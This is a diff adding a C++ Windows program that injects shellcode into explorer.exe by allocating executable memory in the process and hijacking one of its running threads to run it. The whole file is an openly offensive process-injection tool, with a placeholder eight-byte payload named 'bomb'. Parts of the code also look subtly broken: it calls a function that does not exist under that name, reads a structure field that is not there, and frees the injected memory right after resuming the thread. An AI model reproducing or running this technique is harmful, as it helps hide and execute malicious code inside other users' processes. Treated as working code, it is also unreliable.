@@ -1,0 +1,153 @@
+#include <iostream>
+#include <Windows.h>
+#include <TlHelp32.h>
+#include <psapi.h>
+
+DWORD GetProcessIdByName(const std::wstring& processName) {
+    DWORD processIds[1024], bytesReturned;
+    if (!EnumProcesses(processIds, sizeof(processIds), &bytesReturned)) {
+        std::cerr << "Failed to enumerate processes. Error: " << GetLastError() << std::endl;
+        return 0;
+    }
+
+    DWORD processCount = bytesReturned / sizeof(DWORD);
+
+    for (DWORD i = 0; i < processCount; ++i) {
+        if (processIds[i] == 0) continue;
+
+        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIds[i]);
+        if (hProcess) {
+            WCHAR processNameBuffer[MAX_PATH];
+            if (GetModuleFileNameEx(hProcess, NULL, processNameBuffer, MAX_PATH)) {
+                std::wstring currentProcessName(processNameBuffer);
+                if (currentProcessName.find(processName) != std::wstring::npos) {
+                    CloseHandle(hProcess);
+                    return processIds[i];
+                }
+            }
+            CloseHandle(hProcess);
+        }
+    }
+
+    std::cerr << "Process not found." << std::endl;
+    return 0;
+}
+
+bool InjectShellcode(DWORD pid, const unsigned char* shellcode, size_t shellcodeSize) {
+    HANDLE phandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!phandle) {
+        std::cerr << "Failed to open process. Error: " << GetLastError() << std::endl;
+        return false;
+    }
+
+    PVOID rBuffer = VirtualAllocEx(phandle, NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!rBuffer) {
+        std::cerr << "Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
+        CloseHandle(phandle);
+        return false;
+    }
+
+    if (!WriteProcessMemory(phandle, rBuffer, shellcode, shellcodeSize, NULL)) {
+        std::cerr << "Failed to write shellcode to target process. Error: " << GetLastError() << std::endl;
+        VirtualFreeEx(phandle, rBuffer, 0, MEM_RELEASE);
+        CloseHandle(phandle);
+        return false;
+    }
+
+    // Find a thread to hijack (this time, we check all threads' state)
+    HANDLE hThread = NULL;
+    THREADENTRY32 tEntry;
+    tEntry.dwSize = sizeof(THREADENTRY32);
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (snapshot == INVALID_HANDLE_VALUE) {
+        std::cerr << "Failed to create snapshot. Error: " << GetLastError() << std::endl;
+        VirtualFreeEx(phandle, rBuffer, 0, MEM_RELEASE);
+        CloseHandle(phandle);
+        return false;
+    }
+
+    bool threadFound = false;
+    Thread32First(snapshot, &tEntry);
+    while (Thread32Next(snapshot, &tEntry)) {
+        if (tEntry.th32OwnerProcessID == pid) {
+            // Open each thread and check its status
+            HANDLE hTempThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME, FALSE, tEntry.th32ThreadID);
+            if (hTempThread) {
+                // Check if the thread is in a runnable state (not suspended, not in a wait state, etc.)
+                THREAD_BASIC_INFORMATION tbi;
+                ULONG returnLength;
+                NTSTATUS status = NtQueryThreadInformation(hTempThread, ThreadBasicInformation, &tbi, sizeof(tbi), &returnLength);
+                if (status == 0) { // NT_SUCCESS status
+                    // Assume threads with Running state (status == 5) are good candidates
+                    if (tbi.ThreadState == 5) {  // THREAD_STATE_RUNNING
+                        hThread = hTempThread;
+                        threadFound = true;
+                        break;
+                    }
+                }
+                CloseHandle(hTempThread);
+            }
+        }
+    }
+
+    CloseHandle(snapshot);
+    if (!threadFound) {
+        std::cerr << "No valid thread found to hijack." << std::endl;
+        VirtualFreeEx(phandle, rBuffer, 0, MEM_RELEASE);
+        CloseHandle(phandle);
+        return false;
+    }
+
+    // Suspend the thread
+    SuspendThread(hThread);
+
+    // Get and set the thread context
+    CONTEXT context;
+    context.ContextFlags = CONTEXT_FULL;
+    if (!GetThreadContext(hThread, &context)) {
+        std::cerr << "Failed to get thread context. Error: " << GetLastError() << std::endl;
+        ResumeThread(hThread);
+        VirtualFreeEx(phandle, rBuffer, 0, MEM_RELEASE);
+        CloseHandle(hThread);
+        CloseHandle(phandle);
+        return false;
+    }
+
+    context.Rip = (DWORD_PTR)rBuffer;
+    if (!SetThreadContext(hThread, &context)) {
+        std::cerr << "Failed to set thread context. Error: " << GetLastError() << std::endl;
+        ResumeThread(hThread);
+        VirtualFreeEx(phandle, rBuffer, 0, MEM_RELEASE);
+        CloseHandle(hThread);
+        CloseHandle(phandle);
+        return false;
+    }
+
+    // Resume the thread
+    ResumeThread(hThread);
+
+    // Cleanup
+    VirtualFreeEx(phandle, rBuffer, 0, MEM_RELEASE);
+    CloseHandle(hThread);
+    CloseHandle(phandle);
+
+    return true;
+}
+
+int main() {
+    std::wstring processName = L"explorer.exe"; // Change the target process name here
+    DWORD pid = GetProcessIdByName(processName);
+
+    if (pid != 0) {
+        unsigned char bomb[] = { 0x40, 0x55, 0x57, 0x48, 0x81, 0xEC, 0xB8, 0x03 }; // Example shellcode
+        if (InjectShellcode(pid, bomb, sizeof(bomb))) {
+            std::wcout << L"Shellcode injected successfully!" << std::endl;
+        } else {
+            std::cerr << "Failed to inject shellcode." << std::endl;
+        }
+    } else {
+        std::wcout << L"Process " << processName << L" not found." << std::endl;
+    }
+
+    return 0;
+}
